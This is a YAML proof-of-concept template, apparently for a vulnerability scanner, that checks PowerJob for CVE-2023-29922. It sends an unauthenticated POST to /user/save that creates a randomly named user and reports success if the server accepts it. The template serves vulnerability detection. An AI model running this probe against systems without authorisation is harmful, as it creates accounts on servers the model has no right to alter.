name: poc-yaml-powerjob-cve-2023-29922
transport: http
set:
  regname: randomLowercase(10)
rules:
  r0:
    request:
      method: POST
      path: /user/save
      follow_redirects: false
      headers:
        Content-Type: application/json;charset=UTF-8
        User-Agent: >-
          Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69
      body: >-
        {"username":"{{regname}}","phone":"test","email":"test@qq.com","webHook":"test"}
    expression: >-
      response.status == 200 &&
      response.body_string.contains("\"success\":true")
expression: r0()
detail:
  author: Secur1ty0(https://github.com/Secur1ty0)
  links:
    - https://github.com/PowerJob/PowerJob/issues/585